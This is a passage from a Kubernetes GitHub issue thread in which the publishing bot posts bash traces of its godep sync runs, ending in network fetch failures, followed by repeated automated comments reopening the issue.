\t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ indent-godeps\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ '[' -z a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>    \t++ git-find-merge a8c7a3fd5e707243af68b10a8a581c2c59248222 upstream-branch\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 'a8c7a3fd5e707243af68b10a8a581c2c59248222^1..upstream-branch' --first-parent\n>    \t+++ git rev-list a8c7a3fd5e707243af68b10a8a581c2c59248222..upstream-branch --ancestry-path\n>    \t+++ git rev-parse a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ local k_last_kube_merge=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ local dep_count=4\n>    \t+ (( i=0 ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=api\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-api-master\n>    \t+ '[' -z 52c905c45d81ff3b21b8b4b22c41492d81f38807 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to 52c905c45d81ff3b21b8b4b22c41492d81f38807'\n>    \t+ git checkout -q 52c905c45d81ff3b21b8b4b22c41492d81f38807\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-apimachinery-master\n>    \t+ '[' -z f479c818ecf507e4efe724c5a35e07faceaa70f9 ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to f479c818ecf507e4efe724c5a35e07faceaa70f9'\n>    \t+ git checkout -q f479c818ecf507e4efe724c5a35e07faceaa70f9\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=cli-runtime\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-cli-runtime-master\n>    \t+ '[' -z 78d2d45232faafb8fd77f7cec2e20a76a985c22c ']'\n>    \t+ pushd ../cli-runtime\n>    \t+ echo 'Checking out k8s.io/cli-runtime to 78d2d45232faafb8fd77f7cec2e20a76a985c22c'\n>    \t+ git checkout -q 78d2d45232faafb8fd77f7cec2e20a76a985c22c\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=client-go\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-client-go-master\n>    \t+ '[' -z 00150196697467040ac918c70a78a55aae3ac596 ']'\n>    \t+ pushd ../client-go\n>    \t+ echo 'Checking out k8s.io/client-go to 00150196697467040ac918c70a78a55aae3ac596'\n>    \t+ git checkout -q 00150196697467040ac918c70a78a55aae3ac596\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' false = true ']'\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 1\n>    \t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>    \t+ git commit -q -m 'sync: update godeps'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code a55a223b8836701d39e3dd202f74329529e8cd5b\n>    \t+ '[' true = true ']'\n>    \t+ echo 'Amending last merge with godep changes.'\n>    \t+ git reset --soft -q a55a223b8836701d39e3dd202f74329529e8cd5b\n>    \t+ git commit -q --amend --allow-empty -C a55a223b8836701d39e3dd202f74329529e8cd5b\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ dst_merge_point_commit=cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' cfa3e71c45a0b3f2f440b88bd8bd2c554863f832 '!=' 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164 ']'\n>    \t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>    \t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ '[' -z a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>    \t++ git-find-merge a8c7a3fd5e707243af68b10a8a581c2c59248222 upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list 'a8c7a3fd5e707243af68b10a8a581c2c59248222^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list a8c7a3fd5e707243af68b10a8a581c2c59248222..upstream-branch --ancestry-path\n>    \t+++ git rev-parse a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ local k_last_kube_merge=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ local dep_count=4\n>    \t+ (( i=0 ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=api\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-api-master\n>    \t+ '[' -z 52c905c45d81ff3b21b8b4b22c41492d81f38807 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to 52c905c45d81ff3b21b8b4b22c41492d81f38807'\n>    \t+ git checkout -q 52c905c45d81ff3b21b8b4b22c41492d81f38807\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-apimachinery-master\n>    \t+ '[' -z f479c818ecf507e4efe724c5a35e07faceaa70f9 ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to f479c818ecf507e4efe724c5a35e07faceaa70f9'\n>    \t+ git checkout -q f479c818ecf507e4efe724c5a35e07faceaa70f9\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=cli-runtime\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-cli-runtime-master\n>    \t+ '[' -z 78d2d45232faafb8fd77f7cec2e20a76a985c22c ']'\n>    \t+ pushd ../cli-runtime\n>    \t+ echo 'Checking out k8s.io/cli-runtime to 78d2d45232faafb8fd77f7cec2e20a76a985c22c'\n>    \t+ git checkout -q 78d2d45232faafb8fd77f7cec2e20a76a985c22c\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=client-go\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-client-go-master\n>    \t+ '[' -z 00150196697467040ac918c70a78a55aae3ac596 ']'\n>    \t+ pushd ../client-go\n>    \t+ echo 'Checking out k8s.io/client-go to 00150196697467040ac918c70a78a55aae3ac596'\n>    \t+ git checkout -q 00150196697467040ac918c70a78a55aae3ac596\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' false = true ']'\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>    \t+ echo 'Remove redundant godep commits on-top of cfa3e71c45a0b3f2f440b88bd8bd2c554863f832.'\n>    \t+ git reset --soft -q cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>    \t+ local repo=sample-cli-plugin\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n 'cfa3e71 Merge pull request #69322 from jpbetz/etcd-client-3.3.9' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-sample-cli-plugin-master'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=master\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-sample-cli-plugin-master.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-sample-cli-plugin-master.sh\n>    \t+ '[' -z '' ']'\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-sample-cli-plugin-master.sh --dependencies api:master,apimachinery:master,cli-runtime:master,client-go:master --mapping-output-file '../tag-sample-cli-plugin-{{.Tag}}-mapping' -alsologtostderr ''\n>    \tfatal: unable to access 'https://github.com/kubernetes/sample-cli-plugin/': Could not resolve host: github.com\n>    \tF1011 03:28:25.070685   25707 main.go:149] Failed to fetch tags for \"origin\": exit status 128\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc430920600, 0xc42f986600, 0x5e, 0xb2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xc77880, 0xc400000003, 0xc4200bc210, 0xc1877a, 0x7, 0x95, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xc77880, 0x3, 0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:149 +0x2bea\n>\n>[11 Oct 18 03:28 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-431203597):\n\n>/reopen\n>\n>The last publishing run failed: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently\n>```\n>[19 Oct 18 00:07 UTC]: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-434083787):\n\n>/reopen\n>\n>The last publishing run failed: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently\n>```\n>[29 Oct 18 21:17 UTC]: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "nikhita", "body": "/remove-kind api-change\r\n/remove-sig api-machinery\r\n/remove-sig scalability\r\n/remove-sig apps\r\n\r\n/sig release"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-435416521):\n\n>/reopen\n>\n>The last publishing run failed: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently\n>```\n>[02 Nov 18 15:25 UTC]: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-435773435):\n\n>/reopen\n>\n>The last publishing run failed: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently\n>```\n>[05 Nov 18 07:02 UTC]: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-436029710):\n\n>/reopen\n>\n>The last publishing run failed: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently\n>```\n>[05 Nov 18 20:49 UTC]: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-436463453):\n\n>/reopen\n>\n>The last publishing run failed: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently\n>```\n>[07 Nov 18 00:49 UTC]: failed to fetch at /go-workspace/src/k8s.io/kubernetes: reference has changed concurrently```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-437101582):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>...nch-base 32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\tRewriting upstream branch release-1.10 to only include commits for staging/src/k8s.io/metrics.\n>\tRunning git filter-branch ...\n>\t+ echo 'Rewriting upstream branch release-1.10 to only include commits for staging/src/k8s.io/metrics.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' 